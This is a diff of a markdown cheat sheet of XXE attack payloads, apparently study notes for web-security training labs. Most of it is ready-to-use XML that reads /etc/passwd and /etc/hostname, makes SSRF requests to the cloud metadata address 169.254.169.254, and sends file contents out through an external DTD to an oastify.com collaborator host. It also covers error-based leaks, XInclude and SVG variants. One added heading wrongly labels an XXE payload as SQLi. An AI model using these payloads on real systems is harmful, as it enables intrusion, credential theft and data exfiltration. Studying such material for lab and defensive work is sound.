@@ -1,3 +1,10 @@
+
+#SQLi
+```xml
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
+No olvidar llamar la variable &xxe; dentro de <productId>&xxe;<productId/>
+```
+
 -  XXE -> Basic LFI
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -11,6 +18,7 @@
     </storeId>
 </stockCheck>
 ```
+
 - XXE -> SSRF
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -24,6 +32,7 @@
 	</storeId>
 </stockCheck>
 ```
+
 - XXE -> Out of Band Interaction
 ```html
 <?xml version="1.0" encoding="UTF-8"?>
@@ -37,25 +46,29 @@
 	</storeId>
 </stockCheck>
 ```
+
 - XXE -> Out of Band Interaction via parameter entity
-```html
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://i6po3dc4nj9xnl5hr84cfs910s6juaiz.oastify.com"> %xxe; ]>
 ```
+
 - XXE -> Exfiltrate data with .dtd
-```
+```js
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://7jrdg2pt08mm0ai64xh1shmqdhj97zvo.oastify.com?content=%file;'>">
 %eval;
 %exfil;
 ```
+
 - XXE -> Exfiltrate data via error messages
-```
+```js
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
 %eval;
 %exfil;
 ```
+
 - XXE -> Use XInclude in a parameter (url encode the payload)
 ```html
 ?productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
@@ -65,6 +78,7 @@ or
 
 <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="{filePath}" parse="text"/>
 ```
+
 - XXE -> XXE on svg
 ```html
 <?xml version="1.0" standalone="yes"?>
@@ -73,6 +87,9 @@ or
    <text font-size="16" x="0" y="16">&xxe;</text>
 </svg>
 ```
+
+---
+
 #### XXE to perform SSRF
 ```xml
 The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`
@@ -118,19 +135,17 @@ Get a DNS response
 
 ##### Exploiting blind XXE to exfiltrate data using a malicious external DTD
 Save DTD file on your side "ext.dtd"
-```
+```js
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://7jrdg2pt08mm0ai64xh1shmqdhj97zvo.oastify.com?x=%file;'>">
 %eval;
 %error;
 ```
-
-Send XML payload
-```
+**Send XML payload**
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://yoursite/ext.dtd"> %xxe;]>
 ```
-
 
 ##### Exploiting blind XXE to retrieve data via error messages
 When we try the payload from the previous exercise, we get an error, then we try to abuse that error to display file contents:
@@ -149,25 +164,27 @@ Send payload
 ```
 The error will contain the name of the file, and the name of the file is the content of etc/passwd
 
-##### Abusing XInclude
-```html
+* ##### Abusing XInclude
+
+```xml 
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file:///etc/passwd"/></foo>
-```
 
-```html
 productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
 ```
-##### XXE on svg image
-```html
+
+* ##### XXE on svg image
+
+```xml
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
 <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
 </svg>
 ```
+ 
+ * #### xmlns load etc/passwd
 
-##### xmlns load etc/passwd
-```
+```xml
 <rpo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></rpo>
 ```
